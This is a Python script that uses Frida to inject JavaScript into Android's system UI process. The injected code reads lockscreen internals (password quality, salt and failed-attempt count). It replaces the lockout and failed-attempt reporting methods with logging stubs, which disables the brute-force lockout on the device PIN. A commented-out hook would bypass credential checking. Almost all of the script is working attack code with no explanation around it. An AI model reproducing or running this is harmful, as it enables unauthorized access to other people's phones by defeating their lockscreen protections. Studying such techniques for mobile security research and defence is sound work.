#!/usr/bin/env python
import frida
import sys

device = frida.get_usb_device()
session = device.attach("com.android.systemui")

JSscript = ("""

    function encodeHex(byteArray) {
        const HexClass = Java.use('org.apache.commons.codec.binary.Hex');
        const StringClass = Java.use('java.lang.String');
        const hexChars = HexClass.encodeHex(byteArray);
        return StringClass.$new(hexChars).toString();
    }

    Java.perform(function()
    {

        console.log("::Get app context - Usable to get stored vars etc ::");
        var currentApplication = Java.use("android.app.ActivityThread").currentApplication(); 
        var context = currentApplication.getApplicationContext();
        if(context)
        {
            console.log("::Got app context! ::");
        }
        console.log(JSON.stringify(context.toString()));

        console.log("::Attaching to classes !!::");

        var Activity = Java.use("com.android.internal.widget.LockPatternUtils");

        var RunActivity = Activity.$new(context); 
        var quality = RunActivity.getActivePasswordQuality(0); 
        console.log("::Attaching to classes !!!::");
        var salt = RunActivity.getSalt(0);

        console.log("::Quality ::" + quality);
        console.log("::Salt ::" + salt);        
        console.log("::Failed attempts :: " + RunActivity.getCurrentFailedPasswordAttempts(0));

        RunActivity.reportPasswordLockout.overload('int','int').implementation = function (i,i2) {
            console.log("reportPasswordLockout:" + i + "--" + i2);
        };    
       

        RunActivity.setLockoutAttemptDeadline.overload('int','int').implementation = function (i,i2) {
            console.log("setLockoutAttemptDeadline:" + i + "--" + i2);
        };    


        RunActivity.reportFailedPasswordAttempt.overload('int').implementation = function (i) {
            console.log("reportFailedPasswordAttempt:" + i);
        };         

        var ActivityLockSettingsService = Java.use("com.android.server.locksettings.LockSettingsService");
        
        /*ActivityLockSettingsService.checkCredential.overload('com.android.internal.widget.LockscreenCredential', 'int', 'com.android.internal.widget.ICheckCredentialProgressCallback').implementation = function (lc,i,pc) {
            console.log("checkCredential disabled:" + i);
        };*/         



    });
console.log("Ready!");

""")

script = session.create_script(JSscript)
script.load()
sys.stdin.read()


